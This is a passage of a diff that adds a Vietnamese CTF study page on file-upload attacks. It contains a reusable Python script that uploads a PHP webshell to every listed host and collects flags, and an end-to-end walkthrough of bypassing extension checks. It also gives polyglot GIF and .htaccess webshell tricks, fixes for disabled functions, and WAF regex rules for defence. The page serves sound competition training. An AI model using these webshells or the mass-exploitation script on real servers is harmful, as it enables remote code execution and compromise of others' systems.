+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_upload(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+EXTS = [<span class="s">"php"</span>, <span class="s">"phtml"</span>, <span class="s">"php5"</span>]
+SHELL = <span class="s">b'&lt;?php system($_GET["c"]); ?&gt;'</span>
+
+<span class="k">def</span> <span class="d">exploit_upload</span>(host):
+    <span class="k">try</span>:
+        <span class="k">for</span> ext <span class="k">in</span> EXTS:
+            fname = <span class="s">f"shell.{ext}"</span>
+            requests.post(<span class="s">f"http://{host}/upload"</span>,
+                    files={<span class="s">"file"</span>: (fname, SHELL, <span class="s">"image/jpeg"</span>)}, timeout=5)
+            check = requests.get(<span class="s">f"http://{host}/uploads/{fname}"</span>,
+                    params={<span class="s">"c"</span>: <span class="s">"cat flag.txt"</span>}, timeout=5)
+            m = FLAG_RE.search(check.text)
+            <span class="k">if</span> m:
+                <span class="k">return</span> m.group()
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_upload(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có trang "Đổi avatar", upload file ảnh, chấp nhận <code>.jpg/.png/.gif</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Thử webshell trực tiếp</div><div class="d">Upload <code>shell.php</code> → Response: "Chỉ chấp nhận file ảnh!" ⟹ có kiểm tra đuôi.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Bypass</div><div class="d">Thử đổi tên thành <code>shell.phtml</code> (nội dung vẫn là code PHP) → Response: "Upload thành công: /uploads/shell.phtml".</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Thực thi</div><div class="d">Mở <code>http://TARGET/uploads/shell.phtml?c=id</code> → Response hiện <code>uid=33(www-data)</code> ⟹ webshell hoạt động.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d"><code>?c=cat flag.txt</code> → Response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">6</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08, đã có sẵn đuôi <code>phtml</code> xác nhận ăn, đặt lên đầu danh sách <code>EXTS</code> để nhanh hơn.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex, soi vào tên file trong request upload)</th><th>Khớp gì</th></tr>
+    <tr><td><code>filename=.*\.(php\d?|phtml|phar|pHp)["']?$</code></td><td>Mọi biến thể đuôi PHP phổ biến, không phân biệt hoa thường (cần bật flag <code>(?i)</code>)</td></tr>
+    <tr><td><code>&lt;\?php</code> xuất hiện trong body file (dù đuôi là .jpg)</td><td>Bắt polyglot — nội dung có code PHP dù đội tấn công đổi đuôi thành ảnh</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Không chặn toàn bộ request có từ "php" trong body
+  (ảnh thật có thể chứa chuỗi byte trùng ngẫu nhiên) — ưu tiên regex khớp đúng thẻ mở <code>&lt;?php</code> thực sự.
+  Test DetectionOnly trước.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Upload thành công nhưng mở URL ra 404</td><td>Đoán sai đường dẫn lưu file</td><td>Đọc kỹ Response của bước upload — thường có trả về đường dẫn/tên file thật (có thể bị đổi tên ngẫu nhiên)</td></tr>
+    <tr><td>Mở URL ra NGUYÊN VĂN code PHP (không chạy)</td><td>Thư mục đó không cấu hình chạy PHP</td><td>Thử đuôi khác hoặc tìm cách ghi ra thư mục khác (mục 06.D)</td></tr>
+    <tr><td>Mọi đuôi PHP đều bị chặn</td><td>App check nghiêm, có thể dùng whitelist thay vì blacklist</td><td>Thử hướng khác: polyglot (magic byte) hoặc tìm chuỗi upload khác (vd import file cấu hình) trong app</td></tr>
+    <tr><td>Webshell chạy nhưng <code>system()</code> không cho output gì</td><td>Hàm bị disable trong <code>php.ini</code> (<code>disable_functions</code>)</td><td>Thử hàm khác: <code>shell_exec()</code>, <code>exec()</code>, <code>passthru()</code>, hoặc <code>popen()</code></td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App chỉ kiểm tra đuôi/Content-Type (blacklist hoặc whitelist thiếu sót), VÀ thư mục lưu file nằm trong vùng server thực thi được code.</td></tr>
+    <tr><td>❌</td><td>App thật sự xử lý lại ảnh (resize, đổi định dạng) bằng thư viện ảnh đúng cách — code PHP trong file bị phá hủy khi resize, polyglot không còn tác dụng.</td></tr>
+    <tr><td>❌</td><td>File được lưu với tên ngẫu nhiên HOÀN TOÀN không đoán được VÀ phục vụ qua route riêng không cho thực thi code (vd lưu vào S3/object storage, serve qua CDN tĩnh).</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ upload thường tới khi chạy được lệnh
+  qua webshell.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Đừng quên bước 2 (mở lại URL) — upload "thành công" không có nghĩa đã
+  xong.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> challenge check cả đuôi lẫn magic byte đầu file. Viết file polyglot
+  qua được cả hai.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>GIF89a;&lt;?php system($_GET['c']); ?&gt;</code> lưu với đuôi
+  <code>.php</code> (vẫn cần qua được check đuôi riêng, kết hợp với mục 06.B).</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app cho upload file <code>.htaccess</code> tùy ý (không hề chặn tên file
+  đặc biệt này) nhưng chặn mọi đuôi PHP cho file thường. Viết cách khai thác.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Upload <code>.htaccess</code> tự khai báo
+  <code>AddType application/x-httpd-php .jpg</code>, sau đó upload file <code>.jpg</code> chứa code PHP — giờ
+  server coi mọi <code>.jpg</code> trong thư mục đó là PHP.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Webshell</td><td>File code (thường PHP) khi server chạy sẽ cho phép gửi lệnh hệ thống qua tham số URL.</td></tr>
+    <tr><td>Magic byte</td><td>Vài byte đầu cố định xác định loại file thật, độc lập với tên/đuôi file.</td></tr>
+    <tr><td>Polyglot file</td><td>1 file hợp lệ cùng lúc ở nhiều định dạng (vd vừa là ảnh GIF hợp lệ vừa chứa code PHP chạy được).</td></tr>
+    <tr><td>Zip-slip</td><td>Lỗ hổng khi giải nén file zip có tên entry chứa <code>../</code>, ghi đè file ra ngoài thư mục dự định.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/SecLists/Web-Shells/</code>, <code>~/hoc/CTF/Tools/web/CyberChef/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Upload Insecure Files/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("upload-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("upload-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
